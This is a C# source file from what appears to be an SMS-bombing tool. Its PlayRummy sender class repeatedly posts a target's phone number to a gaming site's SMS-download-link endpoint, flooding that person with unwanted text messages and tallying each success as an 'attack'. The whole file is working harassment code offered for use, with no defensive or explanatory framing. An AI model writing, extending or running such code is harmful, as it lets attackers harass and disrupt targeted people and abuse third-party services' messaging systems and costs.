using System;
using System.Net.Http;
using System.Threading.Tasks;
using System.Collections.Generic;

namespace SMS_Bomber.Sender
{
    public class PlayRummy : ISender
    {
        public int Failed { get; set; }
        public int Attacked { get; set; }
        public int TotalRequest { get; set; }
        public string Provider => "PlayRummy";

        private readonly HttpClient Attacker = new HttpClient();
        private readonly Uri SendAPI = new Uri("https://www.playrummy.com/updateData.php");

        public async Task<bool> Attack(long To, bool Retry = false)
        {
            TotalRequest++;
            var AtkMSG = new HttpRequestMessage(HttpMethod.Post, SendAPI)
            {
                Content = new FormUrlEncodedContent(new Dictionary<string, string>
                {
                    { "mobile", To.ToString() },
                    { "data", "sms_download_link" }
                })
            };

            try
            {
                var AtkRES = await (await Attacker.SendAsync(AtkMSG)).Content.ReadAsStringAsync();
                if (AtkRES.Contains("1")) { Attacked++; return true; }
            }
            catch { }

            Failed++;
            return false;
        }
    }
}
